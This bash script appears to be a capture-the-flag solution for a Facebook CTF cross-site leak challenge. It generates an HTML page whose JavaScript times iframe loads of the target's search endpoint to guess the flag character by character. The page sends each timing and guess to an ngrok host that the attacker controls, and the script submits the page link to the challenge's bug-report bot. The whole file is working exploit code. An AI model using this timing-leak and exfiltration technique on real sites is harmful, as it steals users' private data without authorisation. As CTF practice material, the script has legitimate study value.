#/bin/bash

iterate='iterate.txt';

while read c1; 
do
  data="$(sh ./get.sh)";
  echo "${data}";

  hash="$(go run pow.go $data)";

  echo "${hash}";

  flag="fb{cr055_s173_L34|<5_4r";

  flag="$flag$c1";
  echo $flag;

  html="<!DOCTYPE html>
  <html>
  <body>
  <script>

  var flag=\"${flag}\"
  var url =  \"http://challenges.fbctf.com:8082/search?query=\"+flag;

    var iframe = document.createElement('iframe');
  iframe.setAttribute('t1', (new Date()).getTime());
  iframe.setAttribute('src',url);
  iframe.onload = function () {
      var t2 = (new Date()).getTime();
      var out = ( t2 - parseInt(this.getAttribute('t1')));

     var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        console.log('fucked');
        }
      };
      xhttp.open(\"GET\", \"http://987bd815.ngrok.io/fbctf/send.php?time=\"+out+'&flag='+flag, true);
      xhttp.withCredentials = true;
      xhttp.send();

  }
  document.body.appendChild(iframe);


  </script>
  </html

  ";
  htmlDir=index.html;

  echo "$html" > "$htmlDir";
  curl "http://challenges.fbctf.com:8082/report_bugs" -X POST --data "title=msrk&body=msrk&link=http://987bd815.ngrok.io/fbctf/index.html&pow_sol=${hash}" --cookie-jar cookies.txt --cookie cookies.txt;
  
done < $iterate

# 